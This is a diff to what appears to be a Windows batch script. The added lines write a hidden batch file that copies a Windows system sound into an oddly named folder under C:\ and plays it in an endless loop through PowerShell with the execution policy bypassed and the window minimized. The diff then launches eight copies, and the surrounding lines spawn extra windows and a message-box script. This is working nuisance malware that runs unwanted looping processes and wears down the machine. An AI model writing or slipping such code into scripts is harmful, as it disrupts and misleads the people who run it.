@@ -168,6 +168,28 @@ software\.
 cd C:\Users\%username%\Desktop
 echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
 start
+echo @echo off >> s0ndddd44.bat
+echo mode 30 , 01 >> s0ndddd44.bat
+echo powershell -window minimized -command "" >> s0ndddd44.bat
+echo cd C:\ >> s0ndddd44.bat
+echo md sv1rs0und887565421854354 >> s0ndddd44.bat
+echo cd C:\Windows\Media >> s0ndddd44.bat
+echo copy "Windows Foreground.wav" C:\sv1rs0und887565421854354 /y >> s0ndddd44.bat
+echo cd C:\sv1rs0und887565421854354 >> s0ndddd44.bat
+echo ren "Windows Foreground.wav" s000156287.wav >> s0ndddd44.bat
+echo powershell -ExecutionPolicy Bypass -c (New-Object Media.SoundPlayer "C:\sv1rs0und887565421854354\s000156287.wav").PlaySync(); >> s0ndddd44.bat
+echo goto loop >> s0ndddd44.bat
+echo :loop >> s0ndddd44.bat
+echo powershell -ExecutionPolicy Bypass -c (New-Object Media.SoundPlayer "C:\sv1rs0und887565421854354\s000156287.wav").PlaySync(); >> s0ndddd44.bat
+echo goto loop >> s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
+start s0ndddd44.bat
 start
 start 
 start hhhh.vbs 
